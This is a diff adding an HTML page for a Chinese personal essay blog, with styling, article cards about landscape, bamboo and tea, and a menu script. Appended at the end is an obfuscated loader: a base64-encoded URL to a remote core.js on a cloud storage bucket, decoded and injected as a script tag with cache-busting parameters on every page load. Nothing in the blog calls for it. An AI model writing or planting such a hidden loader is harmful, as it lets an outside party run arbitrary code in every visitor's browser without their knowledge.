@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>墨语心境 - 笔尖的流光</title>
+    <style>
+        body {
+            overflow: hidden;
+            font-family: 'Noto Serif SC', 'Georgia', serif;
+            /* 优雅的衬线字体，优先思源宋体 */
+            margin: 0;
+            padding: 0;
+            background-color: #FDFDFD;
+            /* 几乎纯白背景 */
+            color: #555555;
+            /* 柔和的深灰色文本 */
+            line-height: 1.8;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 90%;
+            margin: 0 auto;
+            padding: 30px 0;
+        }
+
+        /* 头部 - 留白与写意 */
+        header {
+            background-color: transparent;
+            /* 透明背景，与body融合 */
+            padding: 50px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 40px;
+        }
+
+        header::before {
+            /* 顶部水墨晕染效果 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%) translateY(-50%) rotate(15deg);
+            width: 80%;
+            height: 150px;
+            background: radial-gradient(ellipse at center, rgba(173, 216, 230, 0.3) 0%, transparent 70%);
+            /* 浅蓝色晕染 */
+            border-radius: 50%;
+            opacity: 0.6;
+            z-index: 0;
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
+            /* 更具书法感的标题字体 */
+            font-size: 3em;
+            color: #333333;
+            /* 标题深色 */
+            letter-spacing: 2px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+            font-weight: normal;
+            /* 减轻标题重量 */
+        }
+
+        header p {
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+            /* 副标题使用无衬线 */
+            font-size: 1.2em;
+            color: #777777;
+            margin-top: 15px;
+            position: relative;
+            z-index: 1;
+            font-style: italic;
+        }
+
+        /* 菜单切换按钮 - 简洁图标 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2.2em;
+            /* 图标大小 */
+            color: #777777;
+            /* 柔和的颜色 */
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            /* 绝对定位在头部右上角 */
+            top: 30px;
+            right: 20px;
+            z-index: 2;
+            transition: color 0.3s ease, transform 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            color: #4CAF50;
+            /* 强调色 */
+            transform: scale(1.1);
+        }
+
+        /* 侧边导航菜单 - 轻盈通透 */
+        nav {
+            position: fixed;
+            top: 0;
+            right: -280px;
+            width: 250px;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            /* 半透明白色背景 */
+            backdrop-filter: blur(8px);
+            /* 柔和模糊 */
+            -webkit-backdrop-filter: blur(8px);
+            border-left: 1px solid rgba(220, 220, 220, 0.5);
+            /* 极细柔和边框 */
+            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
+            /* 柔和阴影 */
+            transition: right 0.4s ease-in-out;
+            z-index: 1001;
+            padding-top: 80px;
+            box-sizing: border-box;
+        }
+
+        nav.is-open {
+            right: 0;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            /* 列表项间距更小 */
+        }
+
+        nav ul li a {
+            color: #555555;
+            text-decoration: none;
+            padding: 12px 20px;
+            border-bottom: 1px solid rgba(240, 240, 240, 0.5);
+            /* 极细半透明分隔线 */
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 1em;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: rgba(76, 175, 80, 0.08);
+            /* 强调色极浅背景 */
+            color: #4CAF50;
+            /* 强调色文字 */
+            transform: translateX(3px);
+            /* 悬停时轻微右移 */
+        }
+
+        nav ul li:last-child a {
+            border-bottom: none;
+        }
+
+        nav ul li a .icon {
+            margin-right: 15px;
+            font-size: 1.4em;
+            color: #4CAF50;
+            /* 图标强调色 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.2);
+            /* 更轻的半透明黑色 */
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
+        }
+
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        main {
+            padding-top: 30px;
+        }
+
+        /* 内容区 - 柔和卡片与留白 */
+        section {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 15px;
+            /* 柔和圆角 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            /* 柔和阴影 */
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #EEEEEE;
+            /* 极细边框 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+        }
+
+        section h2 {
+            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
+            font-size: 2.2em;
+            color: #333333;
+            margin-top: 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #E0E0E0;
+            /* 细分隔线 */
+            padding-bottom: 10px;
+            font-weight: normal;
+        }
+
+        section .date {
+            font-size: 0.9em;
+            color: #999999;
+            margin-bottom: 20px;
+            display: block;
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+        }
+
+        section p {
+            font-size: 1.05em;
+            color: #666666;
+            margin-bottom: 25px;
+        }
+
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            border: 2px solid #DDDDDD;
+            /* 柔和边框 */
+        }
+
+        .read-more {
+            display: inline-block;
+            background-color: #4CAF50;
+            /* 强调色按钮 */
+            color: #FFFFFF;
+            padding: 12px 28px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .read-more:hover {
+            background-color: #388E3C;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        /* 页脚 - 简洁淡雅 */
+        footer {
+            background-color: #F8F8F8;
+            /* 略深于背景的浅灰色 */
+            color: #777777;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 1px solid #E0E0E0;
+            /* 细分隔线 */
+            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .social-links a {
+            color: #777777;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 1.4em;
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+
+        .social-links a:hover {
+            color: #4CAF50;
+            /* 强调色 */
+            transform: translateY(-3px) scale(1.1);
+        }
+    </style>
+    <link rel="stylesheet" href="./static/css/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>墨语心境</h1>
+            <p>笔尖的流光，心灵的印记</p>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+        </div>
+    </header>
+
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#latest-posts"><span class="icon">&#9999;&#65039;</span> 最新随笔</a></li>
+            <li><a href="#reflections"><span class="icon">&#128161;</span> 心灵感悟</a></li>
+            <li><a href="#about-me"><span class="icon">&#128100;</span> 关于我</a></li>
+            <li><a href="#contact"><span class="icon">&#128231;</span> 联系方式</a></li>
+        </ul>
+    </nav>
+
+    <div class="overlay" id="menuOverlay"></div>
+
+    <div class="container">
+        <main>
+            <section id="latest-posts">
+                <h2>最新随笔</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1&seed=ink-wash-mountain" alt="水墨山水"
+                            class="random-image">
+                        <h2>山水入画：生活中的诗意</h2>
+                        <span class="date">2025年07月29日</span>
+                        <p>在快节奏的都市生活中，如何寻找一份属于自己的山水意境？本文分享了从日常中发现诗意的方法。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2&seed=bamboo-forest" alt="竹林幽径"
+                            class="random-image">
+                        <h2>竹影婆娑：静谧中的力量</h2>
+                        <span class="date">2025年07月25日</span>
+                        <p>竹的坚韧与柔美，如同人生。在竹林幽径中，我感受到了内心的平静与力量。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3&seed=tea-ceremony" alt="茶道"
+                            class="random-image">
+                        <h2>一盏清茶：品味人生百态</h2>
+                        <span class="date">2025年07月18日</span>
+                        <p>茶道不仅是泡茶的艺术，更是修身养性的过程。在茶香中，我品味着人生的酸甜苦辣。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 墨语心境. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">微信</a> |
+                <a href="#" target="_blank">知乎</a> |
+                <a href="#" target="_blank">简书</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
+
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
+            }
+
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            behavior: 'smooth'
+                        });
+                        toggleMenu();
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const encodedUrl = "aHR0cHM6Ly9wZXJzb25zaW1nLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vcGVyc29uc2ltZy9jb3JlLmpz";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
+            }
+            init();
+        })();
+    </script>
+
+</body>
+
+</html>
